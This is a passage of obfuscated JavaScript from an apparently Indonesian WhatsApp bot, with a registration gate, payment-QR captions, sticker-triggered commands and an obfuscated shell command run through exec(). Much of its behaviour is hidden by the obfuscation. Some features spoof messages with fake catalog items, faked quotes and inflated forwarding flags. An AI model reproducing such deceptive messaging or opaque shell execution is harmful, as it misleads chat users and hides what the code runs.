_0x42a884=_0x30da6e;alpha[_0x14351b(0x9fd,0xb02,0xb42,0x697)+'e'](_0xa8533e,_0x42a884,MessageType['buttonsMes'+_0x14351b(0xdf5,0x1005,0x1068,0x129b)],_0x588bf9);};if(autoregister){if(autoregister===![])return;const _0x157856={};_0x157856[_0x593f96(0x3bc,-0x9b,0x536,0x866)+'t']=_0x593f96(0x6be,0xba8,0x5a1,0x55e);const _0x52dc0a={};_0x52dc0a[_0x1e23e4(-0x185,-0xbc,0x200,0x689)]=_0x1e23e4(0x710,0x378,0x400,0x807),_0x52dc0a[_0x593f96(0x2a4,-0x159,0x4c9,-0x145)]=_0x157856,_0x52dc0a[_0x1e23e4(0xdd5,0x859,0x9a0,0x8c9)]=_0x593f96(0x959,0xab7,0x938,0xa52);const _0x31c13f={};_0x31c13f[_0x1e23e4(0x469,0x5,0x1de,0xc8)+'t']=_0x1e23e4(0x726,0x527,0x850,0x5c6)+'RIFY';const _0x135c92={};_0x135c92[_0x1e23e4(-0x2,0x1d3,0x200,-0xc1)]=_0x593f96(0x74a,0x5da,0xaa3,0x9d3)+'ff',_0x135c92[_0x1e23e4(0x535,-0x1cb,0xc6,-0x43c)]=_0x31c13f,_0x135c92[_0x1e23e4(0x879,0x639,0x9a0,0x4f5)]=_0x1e23e4(0x988,0x4b7,0x77b,0x44e);let gaklopo=[_0x52dc0a,_0x135c92];if(isCmd&&!mek[_0x1e23e4(0x7cd,0x7df,0x33f,0x6f4)][_0x593f96(0xac4,0x823,0x638,0xa11)]&&!isOwner&&!isCreator&&!isRegister)return sendButMessage(from,_0x593f96(0x8f6,0xb86,0xb9d,0x8d2)+sender[_0x593f96(0x311,0x2a,0x9c,-0xc2)]('@')[0x1*-0x179b+-0x1*-0x1b15+0x1bd*-0x2]+(_0x1e23e4(-0x19e,0x30d,0x321,0x169)+_0x1e23e4(0x18c,0x274,0x551,0x9d6)+_0x1e23e4(0x33b,0x392,0x3ab,-0x9c)+_0x1e23e4(0xdc,-0x167,0x221,0x616)+_0x1e23e4(0x360,0x799,0x2be,0x668)+_0x593f96(0x57d,0x5f2,0x4d5,0x3c5)+_0x1e23e4(0x52a,0x8a9,0x564,0x4bd)+_0x593f96(0x7a7,0xa08,0xb02,0x869)+'dahulu\x20den'+_0x593f96(0x2fc,0x631,0x56a,-0x68)+_0x1e23e4(0x73c,0x78,0x30e,-0x54)+_0x593f96(0x9c2,0x769,0x7e1,0xa87)+_0x593f96(0x899,0x729,0x651,0x694)+_0x593f96(0x671,0x8dd,0x4d0,0x9e2)),botname+_0x1e23e4(0xa05,0x26c,0x563,0x2fc)+ownername,gaklopo,{'quoted':fgclink2,'contextInfo':{'mentionedJid':[sender]}});}const sendKatalog=async(_0x57a56e,_0x5d0f29,_0xe54769)=>{const _0x1bbeba={'mzaQD':_0x2201ba(-0x1b6,0x2a2,-0x332,0x7b)+_0x2bc608(0x4f9,0x957,0x6df,0x461)+_0x2bc608(0x84,-0x752,-0x483,-0x2a9)+_0x2bc608(0x6d6,0x1d8,-0x2c9,0x20c),'naeCM':'https://g.'+_0x2201ba(0x658,0x706,0x475,0x597)+'/p_20681as'+_0x2bc608(-0x12,0x3b9,0x7c2,0x2ee),'wqylA':_0x2201ba(0x7d1,0x95,0x349,0x4c0)+_0x2bc608(0x889,0x4c,0x63d,0x461)+'/p_2068gt4'+'wc1.jpg','JoROz':_0x2201ba(0x455,0x3e5,0x60a,0x85c)+_0x2201ba(0x68c,0xa5d,0x970,0x597)+_0x2201ba(0x852,0x822,0x90b,0x7f0)+_0x2201ba(0x374,0x27e,-0x2cf,-0x88),'llyIi':function(_0x1517fa,_0x2607a2){return _0x1517fa*_0x2607a2;},'WYigg':function(_0x48dc9a,_0x15ca2d){return _0x48dc9a(_0x15ca2d);},'CaWcp':_0x2bc608(0x2ce,0x2cc,0x772,0x2a0)+_0x2bc608(0x4f1,-0x3fe,-0x333,0x4c),'nHTwv':'3595319159'+_0x2bc608(0x24f,-0x527,-0x86,-0x142),'lsQpc':_0x2201ba(0x331,0x325,0x9f1,0x545),'PMvFF':'100000','qXHjk':_0x2bc608(0x66d,0x85c,0x7f2,0x5cf)+_0x2201ba(0x24c,-0x196,0x1ca,-0x155)+'tsapp.net'};let _0x5108db=[_0x1bbeba[_0x2201ba(0x3ce,0x43a,0x6d6,0x477)],_0x1bbeba['naeCM'],_0x1bbeba[_0x2bc608(0x5e6,0x91d,0x7c9,0x696)],_0x1bbeba[_0x2201ba(0xaf2,0x4c2,0xa21,0x7e5)],_0x2bc608(0xa46,0x47e,0xbd0,0x6f9)+_0x2bc608(0x8e4,0xf0,0x78e,0x461)+_0x2201ba(0x1e7,-0x49b,-0xdf,-0x110)+'2c1.jpg'];var _0x42e6d7=_0x5108db[Math['floor'](_0x1bbeba[_0x2201ba(0x4ad,0x478,0x867,0x532)](Math['random'](),_0x5108db['length']))];let _0x323d76=await _0x1bbeba[_0x2bc608(0x607,0x39b,0x90b,0x4eb)](getBuffer,_0x42e6d7);imeu=await alpha['prepareMes'+_0x2201ba(0x90a,0x423,0xa7c,0x812)](_0x1bbeba[_0x2201ba(0x332,-0x642,-0x26e,-0x154)],_0x323d76,image,{'thumbnail':_0x323d76}),imeg=imeu[_0x2201ba(0x41a,0xc1f,0x6ce,0x73c)][_0x2bc608(0x1b1,0x1e8,-0x62,0x2ad)+'ge'];const _0x48817d={};_0x48817d['productIma'+'ge']=imeg,_0x48817d[_0x2201ba(0x4fb,0x23e,0x939,0x6df)]=_0x1bbeba[_0x2201ba(0x917,0x342,0x431,0x6fd)];function _0x2201ba(_0x322f54,_0x8a6638,_0x57f0aa,_0x35d61e){return _0x1e23e4(_0x322f54-0xbe,_0x8a6638-0x160,_0x35d61e- -0x26b,_0x8a6638);}_0x48817d[_0x2201ba(0x185,0x149,0x32a,0x50f)]=_0x57a56e,_0x48817d[_0x2bc608(0x4f,-0x67e,0x2a4,-0x18e)+'n']=_0xe54769,_0x48817d[_0x2bc608(0x3,0x3ad,0x196,-0x9e)+'de']=_0x1bbeba[_0x2201ba(0x95b,0x59b,0x877,0x522)];function _0x2bc608(_0x20fd6c,_0x66fbcf,_0x1ac052,_0x1cb19f){return _0x1e23e4(_0x20fd6c-0x8b,_0x66fbcf-0x18e,_0x1cb19f- -0x3a1,_0x20fd6c);}_0x48817d[_0x2201ba(-0x547,0x28a,0x5e,-0x17d)+_0x2bc608(-0x216,0x3f9,0x1bb,0x10d)]=_0x5d0f29,_0x48817d[_0x2bc608(-0x38c,-0x37f,0x1f9,0xf)+'mount1000']=_0x1bbeba['PMvFF'],_0x48817d[_0x2bc608(0x281,-0x490,-0x1ed,-0x15)+_0x2bc608(0x6b7,0x465,0x661,0x1bf)]=0x1;const _0x1cc69a={};_0x1cc69a[_0x2bc608(0x1af,0x2e3,0x959,0x48f)+_0x2bc608(0x542,-0x194,0x1db,0x267)]=0x3,_0x1cc69a[_0x2bc608(0x87f,0x807,0xacb,0x70e)+'d']=!![];const _0x38d532={};_0x38d532[_0x2201ba(0x883,0x7ab,0x6bf,0x6c0)]=_0x48817d,_0x38d532[_0x2201ba(0x537,0x6e3,0x922,0x4e3)+_0x2bc608(0x27e,0x698,0x7b,0x579)]=_0x1bbeba['qXHjk'],_0x38d532[_0x2bc608(0x8fe,0x56b,0x94e,0x525)+'o']=_0x1cc69a;const _0x160235={};_0x160235[_0x2bc608(-0x2db,0x187,-0x17d,-0x170)+_0x2bc608(0x45c,0x7f0,0xba6,0x6dc)]=_0x38d532;const _0x2f5cfa={};_0x2f5cfa[_0x2bc608(0x15a,0x1d9,0x7c,0x412)]=ftoko,_0x2f5cfa[_0x2201ba(0x8d4,0x733,0x874,0x65b)+'o']={},res=await alpha[_0x2201ba(0xf4,0x6c7,0xa05,0x516)+_0x2bc608(0x3ce,0x6bb,0x297,0x343)+'ntent'](from,_0x160235,_0x2f5cfa),alpha[_0x2201ba(0xa3c,0x7c3,0x4d8,0x68e)+'sage'](res);},sendImageMaker=async(_0x3fd3b6,_0x25732a,_0x5b00f4)=>{const _0x5cbec3={'MWTmq':function(_0x4671b9,_0x446e7d,_0x399dec){return _0x4671b9(_0x446e7d,_0x399dec);},'BQxoB':_0xfef773(0x10a,-0x335,-0x1b7,0xf),'QdytN':_0x145000(0xaff,0xd0f,0xfd6,0x9c5)+'ta','TxSoy':_0x145000(0xa30,0xc28,0xe3c,0x9f9),'xKUuf':'gold','TcLGw':function(_0x593fda,_0x13320f){return _0x593fda(_0x13320f);},'Ogwbs':function(_0x5c70c9){return _0x5c70c9();},'zvkYG':function(_0x152ad4,_0x132ac6){return _0x152ad4-_0x132ac6;},'ABqkj':function(_0x44f3bd,_0x38840a){return _0x44f3bd===_0x38840a;},'RQfuV':'HZCGk','MDCbV':_0xfef773(0x2fb,0x654,0x253,0x2d8)+_0xfef773(-0x172,0x139,0x4,-0x388)+_0x145000(0x625,0x4d6,0x716,0x337)+_0xfef773(0x6b0,0xb6b,0x67e,0x3de)+'gi','YMnuJ':'owner','AXhLE':_0x145000(0x669,0x499,0x168,0x8c8),'CvAqQ':_0x145000(0xb1c,0xd61,0x10e7,0xa44),'AAByk':_0xfef773(-0x50,0xe4,-0x7,0xea)},_0x7db2ba=await alpha['prepareMes'+'sage'](from,_0x3fd3b6,MessageType['image'],{'thumbnail':Buffer[_0xfef773(0x7f8,0x9bf,0x606,0x1bd)](-0x3*-0x9e8+-0x1*-0x1b9e+-0x3956)});let _0x14fcb9=_0x7db2ba['message'][_0xfef773(0x374,0x5a7,0x6cf,0x43a)+'essage']?_0x7db2ba[_0xfef773(0x61b,0x796,0x675,0x776)][_0xfef773(0x71b,0x702,0x6cf,0x4ce)+_0x145000(0xe10,0xc3d,0x947,0xc6b)]:_0x7db2ba;const _0x189af0={};_0x189af0[_0xfef773(-0x1b5,-0xc9,-0x132,0x1da)]=_0x5cbec3['YMnuJ'],_0x189af0[_0x145000(0x9d,0x3c2,0x585,0x3b7)]={},_0x189af0['type']=0x1,_0x189af0[_0x145000(0x9d,0x3c2,0x585,0x3b7)][_0xfef773(0x2eb,-0x3c6,-0x154,-0x18a)+'t']=_0x5cbec3['AXhLE'];const _0x1af54e={};_0x1af54e['buttonId']=_0x5cbec3[_0xfef773(0x32,0x2b7,0x1a4,-0xe4)],_0x1af54e[_0x145000(0x20d,0x3c2,0xff,0x2cf)]={},_0x1af54e['type']=0x1;function _0xfef773(_0x53abcc,_0x4b4a9c,_0x1f41ec,_0x2b1118){return _0x593f96(_0x1f41ec- -0x510,_0x2b1118,_0x1f41ec-0x19,_0x2b1118-0x4b);}_0x1af54e[_0x145000(0x20d,0x3c2,0xff,0x2cf)][_0x145000(0x285,0x4da,0x575,0x46b)+'t']=_0x5cbec3[_0xfef773(0x3e6,-0x2d5,-0x37,0x211)];const _0x5e7e7c=[_0x189af0,_0x1af54e],_0x590511={'contentText':_0x25732a,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0xfef773(0x8e7,0x139,0x499,0x88f)+_0x145000(0x6d7,0x61e,0x89f,0x805))+_0x5b00f4[_0xfef773(0x135,0x3d,-0x1ff,-0x11)]('@')[0x13f1+0x8f*0x1e+-0x757*0x5],'buttons':_0x5e7e7c,'headerType':0x4,'imageMessage':_0x14fcb9[_0xfef773(0x493,0x8a9,0x675,0x9e0)][_0xfef773(0x7ab,0x7f3,0x31c,0x506)+'ge']},_0x179178={};_0x179178[_0xfef773(-0x5f6,0x1d5,-0x263,-0x507)+'id']=[_0x5b00f4];function _0x145000(_0x1be1f0,_0x2cabf1,_0x3bf6fe,_0x4a7fd1){return _0x593f96(_0x2cabf1-0x11e,_0x3bf6fe,_0x3bf6fe-0x52,_0x4a7fd1-0x1ca);}const _0x4bf495={};_0x4bf495[_0xfef773(0x655,0x7a0,0x481,0x58e)]=mek,_0x4bf495[_0x145000(0xe18,0xbc2,0x8c4,0x1045)+'o']=_0x179178,alpha[_0x145000(0x690,0x981,0x671,0x607)+'e'](from,_0x590511,MessageType[_0xfef773(-0x4c2,0x465,-0x27,-0x427)+_0xfef773(0x2eb,0x4a3,0x74b,0x77a)],_0x4bf495)[_0x145000(0xb10,0xdaa,0x1198,0x1118)](_0x456ede=>{const _0x5afcaa={'LiyhQ':_0x58a236(0x269,0x5ad,0x6aa,0x1e5),'uLQGf':function(_0x52e1d5,_0x500197){return _0x5cbec3['TcLGw'](_0x52e1d5,_0x500197);}};function _0x4d8e74(_0x5c0d30,_0x43c677,_0x20ca75,_0x17ac6c){return _0xfef773(_0x5c0d30-0xf7,_0x43c677-0x5f,_0x43c677-0x575,_0x20ca75);}function _0x58a236(_0x4a811e,_0x4d6fcf,_0xc07bd5,_0x252500){return _0xfef773(_0x4a811e-0xb1,_0x4d6fcf-0xea,_0x252500-0x1f3,_0xc07bd5);}if(_0x5cbec3['ABqkj'](_0x5cbec3[_0x58a236(-0x267,0x29f,0x39,0x18e)],_0x5cbec3[_0x58a236(-0x2b7,0x19b,0x577,0x18e)]))reply(_0x5cbec3[_0x58a236(0x5f0,0x39a,0xa2b,0x5ea)]);else{_0xdfbe81[_0x58a236(0x427,0x626,0x23,0x44f)](_0x5cbec3[_0x58a236(0x6b1,0x48b,0x3bd,0x8c4)](_0x1ef708,_0x3f639d,_0x5cbec3[_0x58a236(0x584,0xac8,0xe58,0x97c)]),_0x22fd98(_0x3e7ad0['tz'](_0x5cbec3['QdytN'])['format'](_0x5cbec3[_0x58a236(0x9e7,0x8ac,0x838,0x523)]),_0x5cbec3[_0x58a236(0x559,0x4d6,0x55d,0xaf)]),_0x5cbec3['TcLGw'](_0x4eac89,_0x58a236(0x842,0x969,0x516,0x931)+'eed'));const _0x1dad01=_0x5cbec3[_0x58a236(0x693,0x417,0x706,0x265)](_0x5710c6),_0xbf8072=_0x5cbec3[_0x58a236(0x829,0xbb8,0x527,0x973)](_0x5cbec3[_0x58a236(0x2ae,-0x266,0x446,0x265)](_0x297e5e),_0x1dad01);_0x5cbec3[_0x58a236(0xda7,0x924,0xcc0,0x8c4)](_0x13b14f,_0x4d8e74(0x79b,0x7e8,0x709,0xab6)+_0x58a236(-0x3a4,0x42f,0x257,0x2b),(_0x1099b2,_0x277d5d,_0x56ab74)=>{const _0x4e9170=_0x277d5d[_0x26e1c8(0x674,0x1a3,0x19d,0x1a0)](_0x5afcaa[_0x26e1c8(0x82e,0x396,0x7fc,0xbca)]);function _0x26e1c8(_0xc1aae0,_0x3a4909,_0x139534,_0x17e3be){return _0x58a236(_0xc1aae0-0xd8,_0x3a4909-0xf2,_0x17e3be,_0xc1aae0- -0x104);}const _0x4c014e=_0x4e9170[_0x45d660(-0x5dd,-0x418,-0x2ed,-0xee)](/Memory:/,_0x45d660(0x21f,0x8ed,0x8c6,0x501)),_0x11341e='*'+_0x4c014e+'Speed:\x20'+_0xbf8072[_0x26e1c8(0x175,0x2a7,0x4c7,-0x154)](-0xb40+0x1e4b+0x1307*-0x1)+_0x45d660(-0x24c,-0x1e2,0x25a,-0x248);function _0x45d660(_0x57d18c,_0x5e75fb,_0x5e7d9a,_0xbb6625){return _0x4d8e74(_0x57d18c-0x139,_0xbb6625- -0x571,_0x5e7d9a,_0xbb6625-0x121);}_0x5afcaa[_0x45d660(0x8ae,0x956,0xb9,0x55a)](_0x2035f0,_0x11341e);});}});},send_qr_gopay=async(_0x14f686,_0x3121a5)=>{ini_bayar=ucapannya2+(_0x417a17(0x9d7,0x9dc,0x9bd,0xc74)+_0x4fbe44(0x22b,0x45b,0x3fb,0x8bd))+pushname+(_0x417a17(0x723,0x988,0x632,0x571)+'\x20:\x20_@')+sender[_0x4fbe44(0x79,-0x23,0xda,0x2e9)]('@')[-0x39f+0x1*-0x146e+0x180d*0x1]+('_\x0a\x0aCaranya'+'\x20:\x0a1.\x20Buka'+'\x20Aplikasi\x20'+_0x417a17(0x40,0x3c7,0x314,-0xa7)+_0x417a17(0x8d8,0x646,0x676,0x285)+'Pilih\x20Pay\x20'+'/\x20Bayar\x0a3.'+'\x20Scan\x20Barc'+_0x417a17(0xadd,0x80a,0x97d,0x6b1)+'\x20GOPAY.\x0a4.'+'\x20dan\x20Masuk'+'kan\x20Nomina'+_0x4fbe44(-0x254,0xee,-0x1d0,-0x2bc)+_0x4fbe44(0x528,0x322,0x3c2,0x1da)+_0x417a17(0x196,0x875,0x512,0x591)+_0x417a17(0xd21,0xdbb,0xafd,0x93a))+ini_mark['split']('@')[0x16*-0x145+-0x1*-0xd79+0xe75]+'_\x0a';const _0x560a18={};function _0x4fbe44(_0x3a6e10,_0x2e3bd3,_0x568f1b,_0x56d4b5){return _0x593f96(_0x2e3bd3- -0x334,_0x568f1b,_0x568f1b-0x11f,_0x56d4b5-0x12d);}_0x560a18[_0x417a17(-0x8b,-0x1a9,0x263,0x361)+'id']=[sender,ini_mark];function _0x417a17(_0x5dca93,_0x393a36,_0x4d35ff,_0x5d5af5){return _0x1e23e4(_0x5dca93-0x105,_0x393a36-0x191,_0x4d35ff-0x194,_0x393a36);}await alpha[_0x4fbe44(0x655,0x52f,0x454,0x905)+'e'](from,_0x14f686,image,{'thumbnail':Buffer[_0x4fbe44(0x950,0x7e2,0xa53,0x3da)](-0xb58+-0x1fd9+0x2b31),'quoted':_0x3121a5,'caption':ini_bayar,'contextInfo':_0x560a18});},send_qr_ovo=async(_0x2b7c46,_0x4caef9)=>{function _0x39cfa0(_0x386c6d,_0xe3b89e,_0x32fe30,_0x586469){return _0x1e23e4(_0x386c6d-0x37,_0xe3b89e-0xcf,_0x586469- -0x6e,_0xe3b89e);}ini_bayar=ucapannya2+(_0x39cfa0(0xc08,0x787,0x44d,0x7bb)+_0x458db7(0x774,0xa95,0x955,0xbbf))+pushname+(_0x458db7(0x661,0x190,0x2af,0x3b5)+'\x20:\x20_@')+sender[_0x458db7(0x2f6,0x59,0x2ad,0x62b)]('@')[0x226a+-0x499+-0x1dd1]+(_0x39cfa0(0x191,-0x107,0x6bd,0x2b7)+_0x458db7(0x80c,0xc26,0x83d,0x6a0)+_0x39cfa0(0xe68,0xc9c,0xa1c,0xa1d)+_0x39cfa0(0x1a3,0x616,-0x194,0x35b)+_0x39cfa0(0x66a,0x4ae,0x77b,0x3fd)+_0x458db7(0x400,0x1a5,-0xc4,0x3b2)+_0x458db7(0xb68,0xf23,0x915,0xd9c)+_0x458db7(0x56f,0x4d9,0x430,0xa36)+_0x458db7(0x990,0x88b,0xcd0,0x5c2)+'OVO.\x0a4.\x20da'+_0x458db7(0xc59,0xdd6,0x83c,0xf50)+_0x39cfa0(0x7c0,0x423,0x81d,0x613)+_0x458db7(0x8b3,0x575,0x659,0xdc1)+_0x458db7(0x67a,0x90c,0x45c,0x7b9)+_0x39cfa0(0x780,0x4e3,-0x10a,0x2e1)+'@')+ini_mark[_0x458db7(0x2f6,0x3bc,0xd7,0x45c)]('@')[0x1*0x2002+0xd44*0x1+-0x2d46]+'_\x0a';function _0x458db7(_0x3403e7,_0x176b3a,_0x12ed9a,_0x3f5766){return _0x593f96(_0x3403e7- -0x1b,_0x3f5766,_0x12ed9a-0x6,_0x3f5766-0x9f);}const _0x35af3f={};_0x35af3f[_0x39cfa0(-0x103,0x4cb,0x1b0,0x61)+'id']=[sender,ini_mark],await alpha[_0x458db7(0x848,0x68c,0x78a,0xbd3)+'e'](from,_0x2b7c46,image,{'thumbnail':Buffer[_0x458db7(0xafb,0x81a,0xab7,0xbee)](0xd*0x5b+0x73f+-0xbde),'quoted':_0x4caef9,'caption':ini_bayar,'contextInfo':_0x35af3f});},send_qr_dana=async(_0x4a3d87,_0x44a8e7)=>{function _0x447dbf(_0x13d378,_0x428fb0,_0x29526b,_0x558226){return _0x1e23e4(_0x13d378-0x198,_0x428fb0-0xb1,_0x29526b-0x312,_0x13d378);}ini_bayar=ucapannya2+('\x0a\x0a\x0a•>\x20Nama'+'\x20:\x20_')+pushname+(_0x242ada(0x84a,0x56a,0x349,-0xec)+_0x447dbf(0xb0c,0x82a,0x8b2,0x4d5))+sender[_0x242ada(0x39e,-0x4fc,-0x22,0x4de)]('@')[-0x5*0x256+0x2377+-0x17c9]+(_0x242ada(0x5e0,0x99,0x3dd,0x507)+_0x447dbf(0x7c8,0x2a1,0x7b1,0x99d)+_0x242ada(0xabf,0x2f0,0x79b,0x32d)+_0x242ada(0x26e,0x107,0x5e2,0x204)+_0x447dbf(0xc55,0x2df,0x77d,0x48c)+_0x447dbf(0xa26,0x8e4,0x54f,0x5b7)+_0x242ada(0x736,0x60a,0x850,0x62f)+_0x242ada(-0x20b,0x487,0x257,0x511)+_0x242ada(0x93f,0x313,0x678,0x363)+_0x447dbf(0xa22,0x790,0x93c,0x750)+_0x447dbf(0x5fa,0x2ad,0x602,0xac9)+'n\x20Nominal\x20'+_0x242ada(0x7b9,0x4c9,0x446,0x573)+_0x242ada(0x849,0xaba,0x8b9,0x975)+_0x447dbf(0xbd6,0x8f2,0xd61,0x8c5)+'\x20@')+ini_mark[_0x447dbf(0x29,0x371,0x445,0xe6)]('@')[0x729+-0xed3+0x7aa]+'_\x0a';const _0x24399a={};function _0x242ada(_0x3112fb,_0x5c4b0d,_0x12677f,_0x1a8733){return _0x1e23e4(_0x3112fb-0xe4,_0x5c4b0d-0x1c1,_0x12677f- -0x155,_0x3112fb);}_0x24399a[_0x242ada(-0x12,-0x1d7,-0x86,0x3da)+'id']=[sender,ini_mark],await alpha[_0x242ada(0x273,0x859,0x530,0x274)+'e'](from,_0x4a3d87,image,{'thumbnail':Buffer[_0x242ada(0xa42,0x485,0x7e3,0xcee)](0x25*-0x99+-0x554*0x3+0x2619),'quoted':_0x44a8e7,'caption':ini_bayar,'contextInfo':_0x24399a});},{groupmenu,quotesmenu,animemenu,coganmenu,helpmenu,convertmenu,funmenu,downloadmenu,makermenu,textpromenu,photooxymenu,telestiker,othermenu,ownermenu,set_stc_cmd,storagemenu,cecanmenu,tagmenu,upmenu,nsfwmenu,asupanmenu,image_effect,allmenu}=require('./zeeone/z'+'eeoneofc'),isBtMsg=type==_0x593f96(0xa91,0x6b1,0xe77,0x81f)+_0x1e23e4(0x3db,0x471,0x471,0xb3)+'ge'?mek['message'][_0x1e23e4(0x862,0x596,0x8b3,0x91c)+'ponseMessa'+'ge'][_0x1e23e4(0x283,-0xdd,0x111,0x35e)+'splayText']:'',isStMsg=type==_0x1e23e4(0xd0f,0xd80,0x8f1,0x88d)+_0x1e23e4(0x8ce,0x630,0xa63,0xf09)?mek[_0x1e23e4(0xde3,0x82c,0x9a7,0xda2)]['listRespon'+_0x593f96(0xc41,0x75c,0x94c,0xfde)]['title']:'',stc=mek['message'][_0x1e23e4(0x4bb,0x472,0x1c2,0x406)+_0x1e23e4(0x59e,0xefe,0xa7d,0xf1b)],msc=mek[_0x593f96(0xb85,0x8b7,0xde4,0x888)][_0x1e23e4(0x72f,0x6fe,0x224,-0x109)+'ge'];wew=fs[_0x593f96(0x75f,0x9a9,0x524,0x770)+'nc']('image/'+thumbnail),alfa2=_0x593f96(0x2a9,0x70f,-0x1f,0x441)+_0x593f96(0x5b5,0x787,0x227,0x678)+_0x593f96(0x635,0x7c8,0xa64,0x552),alfa3='6285716360'+_0x1e23e4(0x8c8,0x70,0x412,0x55)+_0x1e23e4(0x172,-0x55,0x457,0x76d);if(msc){if(msc[_0x593f96(0xa7a,0x664,0x654,0xc6e)]==-0x218c*0x2+-0xd891*-0x1+0x4a03*0x1){const _0x3f40aa={};_0x3f40aa[_0x1e23e4(0x58c,-0x198,0xcf,0x507)+'id']=[alfa],_0x3f40aa[_0x1e23e4(0x8b4,0x598,0x830,0x3ae)+_0x1e23e4(0xafe,0x7ba,0x608,0x7d1)]=0x3e7,_0x3f40aa[_0x1e23e4(0xc43,0xc1e,0xaaf,0xb2d)+'d']=!![],alpha[_0x1e23e4(0x40d,0x327,0x685,0x863)+'e'](from,wew,image,{'thumbnail':fs[_0x593f96(0x75f,0x7f9,0x2c7,0xa0b)+'nc'](_0x1e23e4(0x7d1,0xd55,0xab6,0x71a)+thumbnail),'quoted':ftroli,'caption':help(prefix,hahh,pushname,ownername,status),'contextInfo':_0x3f40aa,'sendEphemeral':!![]});}}if(stc){if(stc['fileLength']==''+cmd_stc_ping){console[_0x1e23e4(0x4c1,0x31c,0x58e,0x4dc)](color(time,_0x1e23e4(0x4a1,0x420,0x17b,0x2e1)),color(moment['tz'](_0x1e23e4(0xdea,0xc3f,0xa13,0xab4)+'ta')[_0x1e23e4(0x491,0x77e,0x949,0x46e)](_0x593f96(0xb0a,0x6f6,0x824,0x711)),'gold'),color('Testing\x20sp'+_0x1e23e4(0x5b1,0x782,0x309,0x3cc)));const timestamp=speed(),latensi=speed()-timestamp;exec(_0x593f96(0x783,0xb36,0xb3a,0x515)+_0x593f96(0x348,0x36d,0x547,0x6b5),(_0x105416,_0xa1bf4b,_0x137260)=>{const _0x1d3bcf=_0xa1bf4b[_0xb8b1a3(0xa25,0x73f,0xcb6,0xb67)]('utf-8');function _0xb8b1a3(_0x228dfc,_0x599001,_0x1afdfa,_0x51e22a){return _0x593f96(_0x228dfc- -0x70,_0x1afdfa,_0x1afdfa-0x166,_0x51e22a-0xa8);}const _0x64b73c=_0x1d3bcf[_0xb8b1a3(0x3ae,0x31f,0x3c5,0x21f)](/Memory:/,_0xb8b1a3(0x99d,0xc37,0x706,0xb0f)),_0x4feefa='*'+_0x64b73c+_0x318fbc(0xbc1,0xa3a,0xded,0xbeb)+latensi[_0x318fbc(0xf9,-0x6,0x544,0x4c3)](0xb1b*-0x2+0x17*-0x185+0x392d)+_0xb8b1a3(0x254,0x2f0,0x126,0x5ce);function _0x318fbc(_0x4d8338,_0x2008c5,_0x21d195,_0x5a1a00){return _0x1e23e4(_0x4d8338-0x65,_0x2008c5-0x4b,_0x5a1a00-0x10b,_0x21d195);}fakegroup(_0x4feefa);});}}stc&&(stc[_0x593f96(0xa7a,0xbe4,0xf49,0x5bb)]==''+cmd_stc_menu&&(console['log'](color(time,_0x1e23e4(-0x38f,-0x1c2,0x17b,-0x395)),color(moment['tz']('Asia/Jakar'+'ta')[_0x593f96(0xb27,0xd5e,0x6eb,0x782)](_0x593f96(0xb0a,0x893,0x8c3,0xb73)),_0x593f96(0x7b3,0xc22,0x30a,0x7dd)),color(_0x593f96(0x689,0xa09,0x9ec,0x4fc)+_0x593f96(0x585,0x7ac,0x7b4,0x508))),ini_thumbb=fs['readFileSy'+'nc'](_0x593f96(0xc94,0xb78,0xa71,0x10f9)+thumbnail),alpha[_0x593f96(0x863,0xcd0,0xc05,0x8cd)+'e'](from,ini_thumbb,image,{'thumbnail':fs[_0x593f96(0x75f,0x645,0xbea,0x28c)+'nc'](_0x1e23e4(0x7ee,0xcc6,0xab6,0x9e1)+thumbnail),'caption':allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),'contextInfo':{'text':allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),'forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![]},'quoted':ftoko})));if(stc){if(stc[_0x593f96(0xa7a,0xd6a,0x764,0x5bb)]==''+cmd_stc_self){console[_0x1e23e4(0x7a8,0x110,0x58e,0x817)](color(time,_0x593f96(0x359,-0xd6,0x6e9,0x1f2)),color(moment['tz'](_0x593f96(0xbf1,0xac1,0x10e6,0xd16)+'ta')['format'](_0x1e23e4(0x962,0xa6f,0x92c,0xa6d)),_0x593f96(0x7b3,0x549,0x5f0,0x6e3)),color(_0x593f96(0x85d,0x696,0x631,0x8e2)+'E'));if(!mek[_0x1e23e4(-0x1d,0x57a,0x33f,0x30a)][_0x593f96(0xac4,0xb0f,0x853,0xed9)]&&!isOwner&&!isCreator)return reply(lang[_0x593f96(0x5d6,0x1e9,0xa18,0x843)]());if(banChats===!![])return;banChats=!![],fakeitem(_0x1e23e4(0xbc1,0xa15,0x6d1,0x8b9)+_0x593f96(0x6fe,0xabc,0xa1c,0x5f8));}}if(stc){if(stc[_0x1e23e4(0xb67,0x3f8,0x89c,0x679)]==''+cmd_stc_public){console[_0x593f96(0x76c,0x367,0x5f8,0x7f3)](color(time,_0x593f96(0x359,0x51e,-0x164,0x4d2)),color(moment['tz']('Asia/Jakar'+'ta')[_0x593f96(0xb27,0xa9b,0x7cc,0xfa9)](_0x593f96(0xb0a,0x9e7,0xc75,0x983)),_0x593f96(0x7b3,0x8d0,0xb52,0x6ce)),color(_0x1e23e4(0x8ed,0x7b2,0x497,0x69)+_0x1e23e4(0x25a,0x215,0x6f3,0x68e)));if(!mek[_0x1e23e4(0xdc,-0xa0,0x33f,0x644)][_0x1e23e4(0x5e2,0x884,0x8e6,0x56f)]&&!isOwner&&!isCreator)return reply(lang['onlyOwner']());if(banChats===![])return;banChats=![],fakeitem(_0x593f96(0x9b5,0x54f,0xd87,0x5a7)+_0x593f96(0xc80,0x1021,0x9de,0xe47));}}if(stc){if(stc[_0x593f96(0xa7a,0xca4,0x9b7,0xe0b)]==''+cmd_stc_image_to_sticker){console[_0x1e23e4(0xa12,0x901,0x58e,0x9a6)](color(time,_0x1e23e4(0x4b7,0x381,0x17b,-0x339)),color(moment['tz']('Asia/Jakar'+'ta')[_0x593f96(0xb27,0x70c,0xe50,0x8e9)]('HH:mm:ss'),'gold'),color(_0x1e23e4(0x20f,-0xbd,0x315,0x741)+_0x593f96(0xa87,0xcec,0xf64,0x9e0)+_0x1e23e4(0x81c,0x95,0x4c0,0x4e2)));const 